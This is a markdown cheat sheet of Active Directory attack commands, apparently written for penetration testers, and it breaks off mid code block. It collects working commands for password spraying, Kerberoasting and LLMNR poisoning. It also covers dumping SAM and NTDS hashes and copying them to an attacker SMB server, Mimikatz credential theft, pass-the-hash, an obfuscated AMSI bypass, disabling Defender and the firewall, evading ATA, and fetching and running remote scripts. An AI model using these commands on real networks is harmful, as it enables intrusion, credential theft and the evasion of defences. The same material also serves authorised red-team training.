## Active Directory Exploitation Cheat Sheet

## Principal Conponets:
* **Domain Controller** (DC): server that runs AD and stores the database of users, computers, and policies.
* **AD Database**: called NTDS.dit, contains all domain objects.
* **Kerberos**: AD's main authentication protocol.
* **Replication**: domain controllers replicate changes made to each other.
* **LDAP**: protocol used to query or modify objects in AD.

## Topics
- [Windows Server AD e Azure AD](#windows-server-ad-e-azure-ad)
- [Domain Authentication](#domain-authentication)
- [Domain Services](#domain-services)
- [Recon Passive](#recon-passive)
- [Recon Active](#recon-active)
- [Capturing Information](#capturing-information)
- [AD Enumeration](#ad-enumeration)
- [Basic Active Directory Attacks](#basic-active-directory-attacks)
- [Port Forwarding and Proxying](#port-forwarding-and-proxying)
- [Bypass and Disable](#bypass-and-disable)
- [Local Privilege Escalation](#local-privilege-escalation)
- [Escalating privileges across domains](#escalating-privileges-across-domains)
- [Across Forest using Trust Tickers](#across-forest-using-trust-tickets)
- [Persistence](#persistence)
- [Attacks Detection via Events](#attacks-detection-via-events)
- [Mitigation and Defense Mechanisms](#mitigation-and-defense-mechanisms)
- [Pentest Azure AD](#pentest-azure-ad)

---

## Summary

- [Active Directory Exploitation Cheat Sheet](#active-directory-exploitation-cheat-sheet)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Domain Enumeration](#domain-enumeration)
    - [Using PowerView](#using-powerview)
    - [Using AD Module](#using-ad-module)
    - [Using BloodHound](#using-bloodhound)
      - [Remote BloodHound](#remote-bloodhound)
      - [On Site BloodHound](#on-site-bloodhound)
    - [Using Adalanche](#using-adalanche)
      - [Remote adalanche](#remote-adalanche)
    - [Export Enumerated Objects](#export-enumerated-objects)
    - [Useful Enumeration Tools](#useful-enumeration-tools)
  - [Local Privilege Escalation](#local-privilege-escalation)
    - [Useful Local Priv Esc Tools](#useful-local-priv-esc-tools)
  - [Lateral Movement](#lateral-movement)
    - [Powershell Remoting](#powershell-remoting)
    - [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
    - [Import a PowerShell Module and Execute its Functions Remotely](#import-a-powershell-module-and-execute-its-functions-remotely)
    - [Executing Remote Stateful commands](#executing-remote-stateful-commands)
    - [Mimikatz](#mimikatz)
    - [Remote Desktop Protocol](#remote-desktop-protocol)
    - [URL File Attacks](#url-file-attacks)
    - [Useful Tools](#useful-tools)
  - [Domain Privilege Escalation](#domain-privilege-escalation)
    - [Kerberoast](#kerberoast)
    - [ASREPRoast](#asreproast)
    - [Password Spray Attack](#password-spray-attack)
    - [Force Set SPN](#force-set-spn)
    - [Abusing Shadow Copies](#abusing-shadow-copies)
    - [List and Decrypt Stored Credentials using Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)
    - [Unconstrained Delegation](#unconstrained-delegation)
    - [Constrained Delegation](#constrained-delegation)
    - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)
    - [DNSAdmins Abuse](#dnsadmins-abuse)
    - [Abusing Active Directory-Integraded DNS](#abusing-active-directory-integraded-dns)
    - [Abusing Backup Operators Group](#abusing-backup-operators-group)
    - [Abusing Exchange](#abusing-exchange)
    - [Weaponizing Printer Bug](#weaponizing-printer-bug)
    - [Abusing ACLs](#abusing-acls)
    - [Abusing IPv6 with mitm6](#abusing-ipv6-with-mitm6)
    - [SID History Abuse](#sid-history-abuse)
    - [Exploiting SharePoint](#exploiting-sharepoint)
    - [Zerologon](#zerologon)
    - [PrintNightmare](#printnightmare)
    - [Active Directory Certificate Services](#active-directory-certificate-services)
    - [No PAC](#no-pac)
  - [Domain Persistence](#domain-persistence)
    - [Golden Ticket Attack](#golden-ticket-attack)
    - [DCsync Attack](#dcsync-attack)
    - [Silver Ticket Attack](#silver-ticket-attack)
    - [Skeleton Key Attack](#skeleton-key-attack)
    - [DSRM Abuse](#dsrm-abuse)
    - [Custom SSP](#custom-ssp)
  - [Cross Forest Attacks](#cross-forest-attacks)
    - [Trust Tickets](#trust-tickets)
    - [Abuse MSSQL Servers](#abuse-mssql-servers)
    - [Breaking Forest Trusts](#breaking-forest-trusts)

---

## Tools

- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) 
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [AD Module](https://github.com/samratashok/ADModule)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
- [Adalanche](https://github.com/lkarlslund/adalanche)

---

## Windows Server AD e Azure AD
### Windows Server AD  
  
* LDAP  
* NTLM  
* Kerberos  
* OU Tree  
* Domains and Forests  
* Trusts  

### Azure AD  
* Rest API's  
* OAuth/SAML  
* OpenID  
* Flat Structure  
* Tenant  
* Guests  


## Find FQDN 
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)

FQDN = Host + Domain
	Host: DC
	Domain: pentest.com
	FQDN = DC.pentest.com

---
## Domain Authentication
### Kerberos - Ticket Based  
<a href="https://www.manageengine.com/products/active-directory-audit/kb/images/event-4771-kerberos-authentication-illustration.jpg" >
  <img height="310em" src="https://www.manageengine.com/products/active-directory-audit/kb/images/event-4771-kerberos-authentication-illustration.jpg" />
</a>

Reference:
- https://www.manageengine.com/products/active-directory-audit/kb/windows-security-log-event-id-4769.html

### NTLM (NT LAN Manager) - Challenge/Response Based 

<a href="https://filestore.community.support.microsoft.com/api/images/45bc59ef-a2e7-4a75-a129-8be12a01dd16?upload=true">
  <img src="https://filestore.community.support.microsoft.com/api/images/45bc59ef-a2e7-4a75-a129-8be12a01dd16?upload=true" />
</a>

Reference:
- https://www.action1.com/zerologon-windows-vulnerability-what-is-it-and-how-to-tackle-it/

## Domain Services
LDAP - Lightweight Directory Access Protocol  
Certificate Services  
Domain Name Services(DNS, LLMNR, NBT-NS)  

## Recon Passive
[X] In Construction  
Search for information such as: user ID's, enrollment, logins, emails, credentials in:  
* Social Media (Linkedin, Instagram, Twitter, etc...);  
* Look for leaks in search engines with shodan and services with pastebin;  
* Code Repositories (github, gitlab, bitbucket, etc...) Using google dorking or web services like grep.app:  
https://grep.app/  
* Discovery emails how Hunter.io, snov.io, mindlead.io and emailfinder for example:  
https://hunter.io/  
https://snov.io/email-finder
https://minelead.io/search/
https://github.com/Josue87/EmailFinder  

## Recon Active
### Host Discovery
* nmap static binary  
```
nmap -sn 10.10.0.0/16
```
https://github.com/andrew-d/static-binaries/tree/master/binaries  
* crackmapexec  
```
crackmapexec smb 192.168.0.20/24
```

* Ping Sweep - PowerShell
```
for ($i=1;$i -lt 255;$i++) { ping -n 1 192.168.0.$i| findstr "TTL"}
```

* Ping Sweep - Bash
```
for i in {1..255};do (ping -c 1 192.168.0.$i | grep "bytes from" &); done
```

* Port Scanning - Bash
```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```
* Port Scanning - NetCat
```
nc -zvn <ip> 1-1000
```
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat

### Capturing Information
* nmap  
```
nmap -sC -sV -A -Pn -T5 -p- <ip>
```

* rustscan
```
rustscan -a <ip> -- -A -Pn
```

* enum4linux  
```
enum4linux <ip>
```
```
enum4linux -a -u "" -p "" <ip> && enum4linux -a -u "guest" -p "" <ip>
```

### Enumerating Users via Kerberos
* kerbrute  
```
kerbrute userenum -d <domain> --dc <ip> userlist.txt
```
* nmap  
```
sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=test.local,userlist.txt <ip>
```
* Wordlists  
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt  
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt  

* lookupsid.py via RPC  
```
impacket-lookupsid anonymous@<ip>
```  
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.py  

### Changing expired password via smbpasswd
* Identify  
```
crackmapexec smb $IP -u users.txt -p pass.txt  
\\ STATUS_PASSWORD_MUST_CHANGE
```
* Changing expired password
```
smbpasswd -r <ip> -U <user>
```

### Validate Credentials/Permissions
* Validation of network user credentials via smb using crackmmapexec  
```
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> 
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa  
crackmapexec smb 192.168.0.10-20 -u administrator -p <password>
```

* List SMB shared folders authentically
```
smbclient -L //<domain> -I <IP> -U <user>
```

* Access a shared folder via SMB
```
smbclient //<domain>/folder -I <IP> -U <user>
```

* smbmap
```
smbmap -H <ip> -u <user> 
```

* See read permission of given user on smb shares
```
crackmapexec smb <ip> --shares -u <user> -p '<pass>'
```

### Transfer Files
* SCP
```
C:\Tools>scp linpeas_linux_amd64 bob@192.168.0.67:/tmp/
bob@192.168.0.67's password:
linpeas_linux_amd64                       
```

### Remote Access
#### Remote Desktop Protocol - RDP

* Create a user  
```
net user <user> <password> /add
```

* Add to local administrators group  
```
net localgroup Administrators <user> /add
```

* Add to group of users who can access via RDP
```
net localgroup "Remote Management Users" <user> /add
net localgroup "Remote Desktop Users" <user> /add
```

* Enable RDP
```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

* move to another user  
```
runas /user:<hostname>\<user> cmd
```

* xfreerdp via RDP with sharing in \\\tsclient\share\
```
xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share
```
* rdesktop via RDP  
```
rdesktop -u <user> -p <password> -d <domain> -f <ip>
```
* evil-winrm
```
evil-winrm -i <ip> -u <user> -p <password>
```

## AD Enumeration
#### net commands of Command Prompt  
* List domain users  
```
net user /domain
```

* List domain groups  
```
net group /domain
```

* View memberships for a particular group  
```
net localgroup <group>
```

* Enumerate domain password policy  
```
net accounts /domain
```

* View interfaces and network information
```
ipconfig /all
```

* View all active TCP connections and the TCP and UDP ports the host is listening on
```
netstat -ant
```

* List running processes
```
tasklist
```

* View system tasks
```
schtasks
```

### RSAT
* Get status RSAT tools
```
Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property DisplayName, State
```

* Installation RSAT
```
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
```

#### cmdlets of Powershell 
* Configure ActiveDirectory Module - RSAT
```
curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
Import-Module .\Microsoft.ActiveDirectory.Management.dll  
Import-Module .\ActiveDirectory.psd1  
```

* Configure PowerView Module
```
curl https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1
. .\PowerView.ps1
```

* List all AD users - properties/description
```
Get-ADUser -Filter * (AD Module)
Get-NetUser (PowerView)
Get-NetUser -Username user (PowerView)
Get-UserProperty (PowerView)
Get-UserProperty -Filter pwdlastset (PowerView)
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
Find-UserField -SearchField Description -SearchTerm "built"
```

* Get all information from a specific user, format it in a table and seeing only the Name attribute
```
Get-ADUser -Identity <user> -Server <server> -Properties * | Format-Table Name,SamAccountName -A
```

* Logged On Users
```
Get-NetLoggedon -ComputerName <domain>
```

* Get locally logged users
```
Get-LoggedonLocal -ComputerName <domain>
```

* Last logon
```
Get-LastLoggedOn -ComputerName <domain>
```

* List Computers
```
Get-NetComputer (PowerView)
Get-NetComputer -OperatingSystem "*<version>*" (PowerView)
Get-NetComputer -Ping (PowerView)
Get-NetComputer -FullData (PowerView)
Get-ADComputer -Filter * -Properties * (AD Module)
Get-ADComputer -Filter * | select Name (AD Module)
Get-ADComputer -Filter * |  findstr <organizationalunit> (AD Module)
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem (AD Module)
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} (AD Module)
```

* Add domain user to a domain group
```
Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
Get-NetGroupMember -GroupName 'SQLManagers'
```

* Get machines from user from spefific group
```
Find-GPOLocation -UserName <user> -Verbose (PowerView)
```
* Find Shares,file servers and sensitive files
```
Get-SmbShare (AD Module)
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose (PowerView)
Invoke-FileFinder -Verbose (PowerView)
Get-NetFileServer (PowerView)
```
* List GPO
```
Get-NetGPO (PowerView)
Get-NetGPO -ComputerName <hostname>.domain> (PowerView)
Get-GPO -All (PowerView)
```

* Get OUs and GPO aplliend on an OU
```
Get-ADOrganizationalUnit -Filter * (AD Module)
Get-NetOU -FullData (PowerView)
Get-NetOU <ou>| %{Get-NetComputer -ADSPath $_} (PowerView)
Get-NetGPO -GPOname <guid> (PowerView)
```

* Get ACLs from user
```
Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs (PowerView)
```

* Get ACL associated with prefix,path and LDAP
```
Get-ObjectAcl -ADSprefix '<prefix>' -Verbose (PowerView)
Get-ObjectAcl -ADSpath "<LDAP>" -ResolveGUIDs -Verbose (PowerView)
(Get-ACL 'AD:\CN=Administrator, CN=Users, DC=example, DC=okay, DC=local').Access
Get-PathAcl -Path "<path>" (PowerView)
```

* Search ACEs
```
Invoke-ACLScanner -ResolveGUIDs (PowerView)
```

* Get groups current domain
```
Get-NetGroup (PowerView)
Get-NetGroup -Domain <domain> (PowerView)
Get-NetGroup -FullData (PowerView)
Get-ADGroup -Filter * | select Name (AD Module)
Get-ADGroup -Filter * -Properties * (AD Module)
```

* List local gorups on machine
```
Get-NetLocalGroup -ComputerName <domain> -ListGroups (PowerView)
```

* Get members of local group
```
Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
```

* Get member from group
```
Get-NetGroupMember -GroupName '<group_name>' (PowerView)
Get-NetGroupMember -GroupName '<group_name>' -Domain <domain> (PowerView)
Get-NetGroupMember -GroupName "Domain Admins" -Recurse (PowerView)
Get-NetGroup -UserName <user> (PowerView)
Get-ADGroupMember -Identity "Domain Admins" -Recursive (AD Module)
Get-ADGroupMember -Identity "Enterprise Administrators" -Recursive (AD Module)
Get-ADPrincipalGroupMembership -Identity <user> (AD Module)
```

* Enumerate AD Admins Group Membership
```
Get-ADGroup -Identity Administrators -Server <server> -Properties * (AD Module)
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name (AD Module)
```

* Provides domain-specific information
```
Get-ADDomain -Server <server> (AD Module)
Get-NetDomain -Domain domain.local (PowerView)
```

* Get objects in Domain
```
Get-ADDomain -Identity domain.local (AD Module)
```

* Get GRP from Restricted Groups or groups.xml
```
Get-NetGPOGroup (PowerView)
```

* Domain Trust
```
Get-NetForestDomain (PowerView)
Get-ADForest (AD Module)
(Get-ADForest).Domains (AD Module)
Get-NetDomainTrust -Domain <domain> (PowerView)
Get-ADForest | %{Get-ADTrust -Filter *}
Get-NetForestDomain -Verbose | Get-NetDomainTrust (PowerView)
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'} (PowerView)
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} (AD Module)
Get-NetDomainTrust | ?{$_.TrustType -eq 'External'} (PowerView)
Get-ADTrust -Filter * -Server <domain_external>
```

* Get SID for current domain
```
Get-DomainSID (PowerView)
(Get-ADDomain).DomainSID (ADModule)
```

* To perform an assertive password spraying attack, you can enumerate accounts that have badPwdCount greater than 0 and avoid them during the attack.
```
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com (ADModule)
```

* Search for AD object that was changed on a specific date
```
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```

* Get info from Domain Policies
```
Get-DomainPolicy (PowerView)
```

* Get domain controllers from current domain  
```
Get-NetDomainController (PowerView)
Get-ADDomainController (AD Module)
```

* User Hunting - finds machines on the domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
```
iex (iwr http://<ip>/PowerView.ps1 -UseBasicParsing)
Invoke-UserHunter
Invoke-UserHunter -Stealth
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -GroupName "<group>" (PowerView)
Get-NetSession -ComputerName <domain> (validate access) (PowerView)
```

* Local Admin Access from all machines and PSSession stateless and stateful
```
iex (iwr http://<file_server_IP>/PowerView.ps1 -UseBasicParsing)
iex (iwr http://<file_server_IP>/Find-PSRemotingLocalAdminAccess.ps1 -UseBasicParsing)
iex (iwr http://<file_server_IP>/Find-WMILocalAdminAccess.ps1 -UseBasicParsing)
Invoke-CheckLocalAdminAccess  
Find-LocalAdminAccess  
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
. .\Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```
```
Invoke-Command -ScriptBlock {whoami} -ComputerName <hostname> 
Enter-PSSession -ComputerName <hostname>
```
or  
```
$sess = New-PSSession -ComputerName <hostname>
Enter-PSSession $sess
```
or  
* PsExec64.exe  
```
PsExec64.exe \\<hostname>.<domain> -u <domain>\user -p <password> cmd
```

### Capturing configuration file credentials
* Powershell History  
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* EXploiting Saved Windows Credentials
```
cmdkey /list  
runas /savecred /user:admin cmd.exe
```

* IIS Configuration  
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
  
* Retrieve Credentials from Software: PuTTY  
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

* Unattended Windows Installations
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
  
* Identify  
```
dir /s *.db
```

* McAfee Enterprise Endpoint Security - Credentials used during installation  
```
C:\ProgramData\McAfee\Agent\DB\ma.db
sqlitebrowser ma.db
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```
https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py

### Automated AD Enumeration and Dumping
#### BoodHound
password default = neo4j:neo4j
* Install and start neo4j - http://localhost:7474/
```
neo4j.bat windows-service install
neo4j.bat start
```
https://neo4j.com/download-center/

* BloodHound CheatSheet
  
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

* BloodHound.exe  
https://github.com/BloodHoundAD/BloodHound/

or  

* Install linux
```
sudo apt update && sudo apt install -y bloodhound
```
* neo4j start - http://localhost:7474/
```
sudo neo4j start
sudo neo4j console
```

* Enumeration - Windows
```
iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All,loggedon
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
```

* bloodhound-python - Dumping and viewing AD tree

```
sudo bloodhound-python -u <user> -p <password> -ns <ip_dc> -d test.local -c all
```
https://github.com/fox-it/BloodHound.py

### Commands BloodHound

* Find a user
```
MATCH (u:User) WHERE u.name =~ '(?i).*licenca.*'RETURN u
```
_________________

* AD Explorer snapshot to Json files
```
git clone https://github.com/c3c/ADExplorerSnapshot.py.git
cd ADExplorerSnapshot.py

sudo apt install python3-venv -y
python3 -m venv venv
source venv/bin/activate
pip install .
pip3 install --user .

python3 ADExplorerSnapshot.py teste1.dat 
```



https://github.com/c3c/ADExplorerSnapshot.py

* enum4linux - enumeration
```
enum4linux -v -u <user> -p <pass> -a <ip>
```
* ldapdomaindump - Dump AD  
https://github.com/dirkjanm/ldapdomaindump

## Basic Active Directory Attacks
### Password Spraying
* kerbrute  
```
kerbrute passwordspray -d test.local --dc <ip> users.txt pass@2022
```
* crackmapexec  
```
crackmapexec smb <ip> -u users.txt -p pass@2022 --no-bruteforce
```

### AS-REP Roasting Attack - not require Pre-Authentication  
* kerbrute - Enumeration Users
```
kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

* GetNPUsers.py - Query ASReproastable accounts from the KDC  
```
python GetNPUsers.py domain.local/ -dc-ip <ip> -usersfile userlist.txt
```
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py

### Kerberoasting 
* GetUserSPNs 
```
impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <ip> -request
```
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py

### LDAP Pass-back 
* Creating a rogue LDAP server  
```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```
```
sudo dpkg-reconfigure -p low slapd
```

* Creating file for ensuring that the LDAP server only supports PLAIN and LOGIN authentication methods  
```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
```
sudo tcpdump -SX -i breachad tcp port 389
```

### NetNTLM Authentication Exploits with SMB
Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.

#### LLMNR Poisoning - Capturing hash in responder
On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.  

```
responder -I eth0 -v
```

---

### Exploring Microsoft Deployment Toolkit - MDT
* Identify MDT  
* Extract  PXE Boot Image  
```
tftp -i <IP> GET "\Tmp\x86x64{...}.bcd" conf.bcd
```

* Retrieve the locations of PXE boot images from BCD file
```
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
tftp -i <IP> GET "<PXE Boot Image Location>" pxeboot.wim
```

* Retrieve credentials from a PXE Boot Image  
```
Get-FindCredentials -WimFile pxeboot.wim
```
https://github.com/wavestone-cdt/powerpxe  

### Extracting hashes
#### Intro
* SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
* NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
* SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
* Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system

#### Get sam and system by registry (From old versions to recent versions)
```
reg save hklm\sam sam
reg save hklm\system system
```

* transfer sam and syste via sharing files via SMB
* Configuring smb server 1    
```
impacket-smbserver share . -smb2support -user user -password teste321
```
* Configuring smb server 2  
```
net use \\<smbserver>\share /USER:user teste321
copy C:\Users\Backup\sam.hive \\<smbserver>\share\
copy C:\Users\Backup\system.hive \\<smbserver>\share\
```
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py

* View smb enumeration  

```
net view \\dc /all
net use * \\dc\c$
net use
```

* use impacket-secretsdump  
```
impacket-secretsdump -sam sam -system system LOCAL
```

#### Get ntds.dit and system by registry - Active Directory

* vssadmin - Volume shadow copy (Windows Server \ recent versions)
```
vssadmin create shadow /for=c:
```

* copy ntds.dit and system
```
copy <Shadow_Copy_Name>\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
copy <Shadow_Copy_Name>\Windows\System32\config\SYSTEM C:\Windows\Temp\system.save
```

* delete volume shadow copy
```
vssadmin delete shadows /shadow=<Shadow_Copy_Id>
```

* use impacket-secretsdump  
```
impacket-secretsdump -ntds ntds.dit.save -system system.save LOCAL
```

#### Others
* meterpreter  
```
hashdump
```

* samdump2 (Win 2k/NT/XP/Vista SAM)   
```
samdump2 system sam
```

#### Extracting Hashes in Domain and Pivoting  
* Dump the credentials of all connected users, including cached hashes
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
* mimikatz + ScriptBlock
```
$sess = New-PSSession -ComputerName <hostname>
```
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
iex (iwr http://<ip>/Invoke-Mimikatz.ps1 -UseBasicParsing)
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
or  
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
Invoke-Mimikatz
```

#### Extracting Hashes in cache
* fgdump  
```
fgdump.exe
```
/usr/share/windows-binaries/fgdump/fgdump.exe

* meterpreter  
```
load kiwi
creds_msv
```

* wce-universal (Clear Text password)   
```
wce-universal.exe -w
```
/usr/share/windows-resources/wce/wce-universal.exe 

* mimikatz
```
.\mimikatz.exe
sekurlsa::wdigest -a full  
sekurlsa::logonpasswords
```

* mimikatz - meterpreter  
```
load mimikatz  
wdigest
```

#### Extracting Hashes (Remote)
```
impacket-secretsdump user:password@IP
```

### Pass-The-Hash and Over-Pass-The-Hash
* mimikatz (perform the pass the hash technique for the machine account to elevate access to domain admin)
```
iex (iwr http://<file_server_IP>/Invoke-Mimikatz.ps1 -UseBasicParsing)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'
```

* Evil-WinRM  
```
evil-winrm -i <ip> -u <user> -H <hash>
```

* pth.exe  
```
pth-winexe -U user%hash //ip cmd.exe
```

* psexec (msfconsole)  
```
use /exploit/windows/smb/psexec
```

## Bypass and Disable
### AppLocker Bypass  
Analyse  
```
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Exclude folder
```
powershell -ep by-pass
Set-MpPreference -ExclusionPath C:\Tools
Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath
```
### AMSI 
(AntiMalwareScan Interface) gives registered antivirus access to the contents of a script prior to execution, dependent on signature-based detection by the active antivirus.  
* Detection of malicious scripts in:  
Memory;  
Disk;  
Ofuscated;  
Enabled by default in Windows 10 and supported by Windows Defender.  
* AMSI Bypass  
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
https://amsi.fail/   
* Disable AMSI  
```
Set-MpPreference -DisableScriptScanning 1
```

### Disable Firewall
```
netsh firewall set opmode disable   
netsh Advfirewall set allprofiles state off 
```

### Disable Windows Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose; Get-MpComputerStatus  
Set-MpPreference -DisableIOAVProtection $true 
```

### PowerShell Bypass
* Types of Bypass:  
Downgrade to version 2;  
Unloading, disabling or unsubscribing;  
Obfuscation;  
Trust abuse (Using trusted executables and code injection in trusted scripts);  

#### Downgrade to version 2;  
PowerShell version 2 lacks many security mechanisms.
```
get-host
powershell.exe -Version 2
get-host
```

### Microsoft ATA (Advanced Threat Analytics) 
https://learn.microsoft.com/pt-br/advanced-threat-analytics/what-is-ata

#### Evading ATA - Overpass-the-hash - Bypass
* normal AS-REQ packet looks like:  
\\ etype: eTYPE AES256-CTS-HMAC-SHA1-96  
* AS-REQ packet overpass-the-hash:  
```
Payload: Invoke-Mimikatz '"sekurlsa::pth /userprivservice /domain:offensiveps.com /ntlm:ntlmhash"'  
```
\\ etype: eTYPE-ARCFOUR-HMAC-MD5  

For bypass:  
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:privservice /domain:offensiveps.com /aes256:aes256 /ntlm:ntlm /aes128:aes128'"
```
AES256+AES128+NTLM(RC4) together reduces chances of detection.  
"AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with KB2871997, in this case you can avoid NTLM hash."  
https://www.blackhat.com/docs/us-17/thursday/us-17-Mittal-Evading-MicrosoftATA-for-ActiveDirectory-Domination.pdf  

#### Evading ATA - Golden Ticket - Bypass
```
Invoke-Mimikatz -Command '"kerberos::golden /User:privservice /domain:offensiveps.com /sid:sid /aes256:aes256keysofkrbrtgt /id:500 /groups:513 /ptt"'
```

### Reverse Shell and Access
* Invoke-PowerShellTcp + powercat  
```
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
